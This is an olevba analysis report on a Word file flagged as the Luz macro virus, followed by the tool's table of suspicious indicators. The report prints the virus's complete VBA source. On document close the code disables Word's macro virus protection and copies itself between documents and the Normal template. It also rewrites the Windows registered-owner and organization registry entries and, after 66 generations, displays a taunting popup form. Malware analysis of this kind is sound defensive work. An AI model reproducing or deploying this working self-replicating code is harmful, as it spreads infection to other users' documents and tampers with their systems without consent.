olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 1
Private Sub Document_Close()
On Error Resume Next

'This is very important information
'please, do not delete or modify !!!

Dim x, Contor As Integer
Dim SaveDocument, SaveNormalTemplate, DocInf, NorInf As Boolean
Dim AD, NT As Object
Dim OurCode, OurCode2, LogData, LogFile, Temp As String

Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DocInf = AD.CodeModule.Find("Am0r", 1, 1, 10000, 10000)
NorInf = NT.CodeModule.Find("Am0r", 1, 1, 10000, 10000)
Contor = 0

Options.VirusProtection = False
Options.SaveNormalPrompt = False

If (DocInf = True Xor NorInf = True) And _
(ActiveDocument.SaveFormat = wdFormatDocument Or _
 ActiveDocument.SaveFormat = wdFormatTemplate) Then
 Randomize
 x = Int(Rnd * 20)
 If x = 10 Then MsgBox "Your name is " & Application.UserName, vbInformation, "Unrequested Info"
 
 If DocInf = True Then
   SaveNormalTemplate = NormalTemplate.Saved
   OurCode = AD.CodeModule.lines(2, AD.CodeModule.countoflines - 1)
   OurCode = "' 1" & Chr(13) & OurCode
   NT.CodeModule.deletelines 1, NT.CodeModule.countoflines
   NT.CodeModule.addfromstring OurCode
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Luz Clarita"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Am0r A La Mexicana"
   ActiveDocument.VBProject.VBComponents.Item(2).Export ("c:\MS Office Luz.frm")
   NormalTemplate.VBProject.VBComponents.Import ("c:\MS Office Luz.frm")
   If SaveNormalTemplate = True Then NormalTemplate.Save
 End If
 
 If NorInf = True And _
   (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
    ActiveDocument.Saved = False) Then
   SaveDocument = ActiveDocument.Saved
   OurCode = NT.CodeModule.lines(1, NT.CodeModule.countoflines)
    OurCode2 = OurCode
    Contor = Int(Trim(Mid(OurCode2, 2, 3))) + 1
    OurCode2 = NT.CodeModule.lines(2, NT.CodeModule.countoflines - 1)
    Temp = Trim("'" & Str(Contor) & Chr(13))
    OurCode2 = Temp + OurCode2
   AD.CodeModule.deletelines 1, AD.CodeModule.countoflines
   AD.CodeModule.addfromstring OurCode
   NT.CodeModule.deletelines 1, NT.CodeModule.countoflines
   NT.CodeModule.addfromstring OurCode2
   NormalTemplate.VBProject.VBComponents.Item(2).Export ("c:\MS Office Luz.frm")
   ActiveDocument.VBProject.VBComponents.Import ("c:\MS Office Luz.frm")
   If SaveDocument = True Then ActiveDocument.Save
 End If
End If
If Contor >= 66 Then
 MsgBox "Hello! " & _
 "My name is Luz Clarita and I'm a very friendly macro-virus." & _
 Chr(13) & "You should share your documents with your friends... :-)" & _
 Chr(13) & "I salut you from Romania!", vbExclamation, "SALUT!"
 Joculetz.Show
End If
End Sub

Private Sub Document_New()

End Sub




























-------------------------------------------------------------------------------
VBA MACRO Joculetz.frm 
in file: Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632 - OLE stream: 'Macros/VBA/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





Private Sub CommandButton1_Click()
Joculetz.Hide
CommandButton1.Caption = "Aha"
End Sub

Private Sub UserForm_Activate()
a = 1
b = 5
Do
 Label1.Font.Size = Label1.Font.Size + a
 CommandButton1.Left = CommandButton1.Left + b
 If Label1.Font.Size >= 35 Then a = -a
 If CommandButton1.Left >= Joculetz.Width - 70 Then b = -b
 If Label1.Font.Size < 8 Then a = -a
 If CommandButton1.Left < 20 Then b = -b
 For i = 1 To 100
   CommandButton1.Caption = Str(i)
 Next i
 CommandButton1.Caption = "Okay"
 dummy = DoEvents
Loop Until CommandButton1.Caption = "Aha"
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Okay�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Luz Clarita Telenovelas Star
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632' - OLE stream: 'Macros/Joculetz/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632' - OLE stream: 'Macros/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Luz-3d72278aa549ec2befd52ef3e392bb2293177632' - OLE stream: 'Macros/Joculetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

